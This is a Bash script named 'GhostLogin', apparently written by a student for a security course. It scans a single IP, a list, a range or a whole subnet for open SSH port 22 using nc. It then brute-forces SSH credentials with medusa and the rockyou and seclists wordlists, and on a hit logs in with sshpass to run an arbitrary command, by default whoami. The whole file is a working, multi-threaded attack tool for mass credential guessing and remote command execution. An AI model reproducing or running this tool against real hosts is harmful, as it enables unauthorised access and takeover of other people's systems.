#Name: Evgeni Genchev
#Student code: s6
#Class code: TCB-2511
#Lecture's name: Ivan Blagoev
#
#
#
#The functionalities, that I added are:
# - IP addresses can be loaded from a file
# - Support for single IP address
# - Scanning, BF adn Logging into multiple threads
# - Custom wait time for responce when scanning
# - Custom commands to be executed through ssh

#Default settings
generated_hosts_file=".hosts"
timeout=1
threads=4
attack_threads=1
cmd="whoami"
userfile="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
passfile="/usr/share/wordlists/rockyou.txt"

#A function that validates the IP address
function ip_check(){
	for ip in $1; do
		ip_octets=$(echo $ip | tr '.' ' ')
		if [ $(echo "$ip_octets" | wc -w) -ne 4 ]; then
			echo "Error: Invalid IP - $ip"
			exit 1
		fi
		for octet in $ip_octets; do
			if [[ $octet -lt 0 || $octet -gt 255 ]]; then
			echo "Error: Invalid IP - $ip"
			exit 1
		fi
		done
	done
}

#If no arguments are provided a help menu is displayed
if [ $# -eq 0 ]; then 
	echo "
Description:
  The tool scans the target for open ssh port and tries to brute-force the credentials, once credentials have been found it executes a command on the target machine.

Options:
  -u Username for the ssh
  -U Username list to try for the ssh
  -p Password to try for the ssh
  -P Password list to try for the ssh
  -h Target's IP address
  -H Targets' IP address list
  -r IP range or subnet
  -t The number of parallel targets attacked (default is set to 4)
  -T The number of parallel attacks to a single target ( default is set to 1)
  -c Command to be executed on a successful ssh login ( default is set to whoami)
  -w The timeout to wait the port scan for response"
	exit 0
fi
#Parse every argument with its value
while getopts "u:U:p:P:h:H:r:t:T:c:w:" opt; do
  case $opt in
    u)
      user="$OPTARG"
      userfile=""
      ;;
    U)
	  userfile="$OPTARG"
	;;
	p)
      password="$OPTARG"
      passfile=""
	;;
	P)
	  passfile="$OPTARG"
	;;
	h)
	  host="$OPTARG"
	  ip_check $host
	  hosts="$host"
	;;
	H)
	  hostfile="$OPTARG"
	  #Validates every IP in the file
	  while read -r ip; do ip_check "$ip"; done < "$hostfile"
	  hosts="$(cat $hostfile)"
	;;
	t)
	  threads="$OPTARG"
	;;
	T)
	  attack_threads="$OPTARG"
	;;
	c)
	  cmd="$OPTARG"
	  ;;
	  w)
	  timeout="$OPTARG"
	  ;;
	r)
		range="$OPTARG"
		#Checks wheather it is a subnet or a range
		if [ -z $(echo "$range" | grep '/') ]; then
			echo "Generating IP range..."
			first_ip=$(echo "$range" | awk -F '-' '{print $1}')
			last_octet=$(echo "$first_ip" | awk -F '.' '{print $4}')
			end=$(echo "$range" | awk -F '-' '{print $2}')
			if [[ $(ip_check $first_ip) -ne 0 || $end -lt 0 || $end -gt 255 || $end -lt $last_octet ]]; then
				echo "Invalid argument for range"
				exit 1
			fi
			#Sets the first three octets
			ip_build=$(echo "$first_ip" | awk -F '.' '{print $1,$2,$3}' | tr ' ' '.')
			#Clears the file
			echo -n > $generated_hosts_file
			#Writes the range into the file
			for i in $(seq $last_octet $end); do
				echo "$ip_build.$i">> $generated_hosts_file;
			done
		else
			echo "Generating subnet..."
			first_ip=$(echo "$range" | awk -F '/' '{print $1}')
			subnet=$(echo "$range" | awk -F '/' '{print $2}')
			if [[ $(ip_check $first_ip) -ne 0 || $subnet -lt 0 || $subnet -gt 32 ]]; then
				exit 1
			fi
			echo -n > $generated_hosts_file
			full_octets=$(($subnet/8))
			#Writes the IP addresses into the file, as it checks wheather the octet should be constant 
			#and it breaks the cycle if it has to be, once the innear once are done
			for i in {0..255}; do
				[[ $full_octets -ge 1 ]] && i=$(echo $first_ip | awk -F '.'  '{print $1}')
				for j in {0..255}; do
					[[ $full_octets -ge 2 ]] && j=$(echo $first_ip | awk -F '.'  '{print $2}')
					for k in {0..255}; do
						[[ $full_octets -ge 3 ]] && k=$(echo $first_ip | awk -F '.'  '{print $3}')
						for h in {0..255}; do
							echo "$i.$j.$k.$h" >> $generated_hosts_file
						done
						[[ $full_octets -ge 3 ]] && break
					done
					[[ $full_octets -ge 2 ]] && break
				done
				[[ $full_octets -ge 1 ]] && break
			done
		fi
		echo "Saving the target list to $generated_hosts_file"
		hosts="$(cat $generated_hosts_file)"
	;;
    \?)
      exit 1
      ;;
  esac
done

#Validation for overused arguments
if [[ -z $host && -z $range && -z $hostfile ]]; then
	echo "-r or -H or -h is required"
	exit 1
fi
if [[ (-n $host && -n $hostfile)|| (-n $range && -n $hostfile) || (-n $host && -n $range)]]; then
	echo "Only one option can be used: -r or -H or -h"
	exit 1
fi
if [[ -n $user && -n $userfile ]]; then
	echo "Only one option can be used: -u or -U"
	exit 1
fi
if [[ -n $password && -n $passfile ]]; then
	echo "Only one option can be used: -p or -P"
	exit 1
fi

#A function that tries to retrieve data from the target machine through ssh, 
#as it is given the correct pass, username and IP address, as well as a command which has to be executed
function open_ssh(){
	echo "[*] Loging in... IP: $1"
	res=$(sshpass -p $3 ssh $2@$1 -q "$cmd")
	if [ $? -ne 0 ]; then
		echo " [-] Could not establish connection"
	else
		echo " [+] Retrieved data from IP: $1: $res"
	fi
}

#A function that builds the medusa command based on the provided options, once a credential is found it displays the data and calls the ssh function
function start_bf(){
	echo "[*] Brute-Forcing $1"
	medusa=(medusa -h "$1" -M "ssh" -b -f -t $attack_threads -v 4 -w 0)
	[[ -n $user ]] && medusa+=(-u "$user")
	[[ -n $userfile ]] && medusa+=(-U "$userfile")
	[[ -n $password ]] && medusa+=(-p "$password")
	[[ -n $passfile ]] && medusa+=(-P "$passfile")
	res=$("${medusa[@]}")
	credential=$(echo "$res" | grep "ACCOUNT FOUND")
	if [ -z "$credential" ]; then
		echo " [-] No login found"
	else
		echo " [+] Found Credentials: $(echo "$credential" | awk '{print $6,$7,$8,$9,$10,$11}')"
		username=$(echo "$credential" | awk '{print $9}')
		pass=$(echo "$credential" | awk '{print $11}')
		open_ssh "$1" "$username" "$pass"
	fi
}

#A function that checks every IP for open port 22
function host_check(){
	nc $1 22 -vzw $timeout 2> /dev/null
	if [ $? -eq 0 ];then
		echo " [+] IP: $1 Port: 22 Status: Open"
		start_bf $1
	else
		echo " [-] IP: $1 Port: 22 Status: Closed"
	fi
}
#Clears the console and displays the name
clear
figlet GhostLogin
echo "[*] Scanning..."
#Starts multiple threads (4 by default), so it can proccess multiple targets, giving better speed
for ip in $hosts;do
	host_check $ip &
	#Doesn't allow to start more threads than requested
	while (($(jobs -r | wc -l) >= threads)); do
		sleep 0.1
	done
done
#Waits for the program to finish all threads and then exits with status code 0
wait
exit 0
